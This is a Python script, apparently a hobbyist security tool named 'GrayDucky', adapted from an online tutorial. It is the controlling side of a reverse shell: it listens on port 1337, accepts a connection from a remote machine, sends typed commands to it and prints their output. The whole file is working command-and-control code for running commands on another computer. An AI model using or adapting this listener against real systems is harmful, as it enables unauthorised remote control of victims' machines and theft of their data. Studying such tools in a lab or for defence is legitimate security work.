#!/usr/bin/env python3

# References, all content property of their authors, 
# written by Nate Ward 2022 unless specified.

# [1] - Portions of this code used from the following guide;
#       https://www.thepythoncode.com/article/create-reverse-shell-python
# [2] - 

# Splash Introduction Screen: for showing script name when loaded.
splashIntro = r'''
   ______                 ____             __          /n
  / ____/________ ___  __/ __ \__  _______/ /____  __  /n
 / / __/ ___/ __ `/ / / / / / / / / / ___/ //_/ / / /  /n
/ /_/ / /  / /_/ / /_/ / /_/ / /_/ / /__/ ,< / /_/ /   /n
\____/_/   \__,_/\__, /_____/\__,_/\___/_/|_|\__, /    /n
                /____/                      /____/     /n
-----------------------------------------------------  /n
'''

import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 1337
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"[+] Listening on PORT:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"[+] {client_address[0]}:{client_address[1]} Connected!")

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
    # get the command from prompt
    command = input(f"{cwd}> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)